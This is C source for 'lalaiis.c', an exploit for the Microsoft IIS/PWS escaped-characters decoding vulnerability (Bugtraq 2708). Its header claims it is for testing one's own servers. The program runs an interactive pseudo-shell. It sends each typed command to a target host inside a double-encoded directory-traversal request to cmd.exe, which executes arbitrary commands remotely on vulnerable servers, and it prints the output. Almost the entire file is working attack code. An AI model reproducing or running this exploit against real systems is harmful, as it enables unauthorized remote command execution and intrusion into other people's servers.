/*  lalaiis.c
    (or Microsoft IIS/PWS Escaped Characters Decoding Command Execution
        Vulnerability) 
   
   Bugtraq id: 2708 

   It gives you a "shell-like" environment to test your IIS servers
   Coded by MovAX <movax@softhome.et>
   Greetz to: lala, HeH! Magazine staff <http://www.dtmf.com.ar/digitalrebel>
   Fuckz to: Feel free to add your handle to this section.

*/


#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>

void usage(void) 
{
 fprintf(stderr, "\nusage: ./lalaiis website> vulnerable_directory");
 fprintf(stderr, "\nwhere vulnerable_directory can be any 'scriptable' dir (like scripts msadc)");
 fprintf(stderr, "\nex: ./lalaiis www.foo.bar scripts\n");
 exit(-1);
}

int main(int argc, char **argv) 
{
 int i, le_socket, le_connect_error, le_timeout ;
 int timeout=80;
 int port=80;
 char temp[1];
 char host[512]=""; 
 char command[1024]="";
 char request[8192]="GET /";
 struct hostent *he;
 struct sockaddr_in s_addr;

 printf(":: lalaiis.c exploit. Coded by MovAX\n");

 if (argc < 3)
    usage();
    
 strncpy(host, argv[1], sizeof(host));
 
 if(!strcmp(host, "")) 
	{
	 fprintf(stderr, "put a damn server\n");
	 usage();
	}

 printf("\n:: Destination host > %s:%d\n", host, port);


 if((he=gethostbyname(host)) == NULL) 
	{
 	 fprintf(stderr, "put a damn VALID server\n");
	 usage();
	}

for (;;)
{
		  command[0]=0;
		  printf("\nlala_shell> ");
		  if(fgets(command, sizeof(command), stdin) == NULL)
		  	  perror("gets"); 
		  command[strlen(command)-1]='\0';
		  if(!strcmp("logout", command))
		  	  exit(-1);

 	 for(i=0;i<strlen(command);i++) 
		 {if(command[i]==' ')
		  	command[i]='+';
		 }

	 strncpy(request, "GET /", sizeof(request));
         strncat(request, argv[2], sizeof(request) - strlen(request));
         strncat(request, "/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+", sizeof(request) - strlen(request));
 	 strncat(request, command, sizeof(request) - strlen(request));
	 strncat(request, " HTTP/1.1\n", sizeof(request) - strlen(request));
	 strncat(request, "host:" ,sizeof(request) - strlen(request));
	 strncat(request, argv[1], sizeof(request) - strlen(request));	
 	 strncat(request, "\n\n", sizeof(request) - strlen(request));

	 s_addr.sin_family = AF_INET;
 	 s_addr.sin_port = htons(port);
 	 memcpy((char *) &s_addr.sin_addr, (char *) he->h_addr, 
 		sizeof(s_addr.sin_addr));	

 	 if((le_socket=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) 
		 {
	 	  perror("socket\n");
	 	  exit(-1);
		 }
 	 alarm(le_timeout);
 	 le_connect_error = connect(le_socket,(struct sockaddr *)&s_addr,sizeof(s_addr));
 	 alarm(0);
	 
 	 if(le_connect_error==-1) 
		 {
	 	  perror("connect");
	 	  exit(-1);
	 	  close(le_socket);
		 }
		 
 	 send(le_socket, request, strlen(request), 0);
 	 while(recv(le_socket,temp,1, 0)>0) 
		 {
         	  alarm(timeout);
	 	  printf("%c", temp[0]);
         	  alarm(0);
		 }	
}
  close(le_socket);	
  return 0;
}
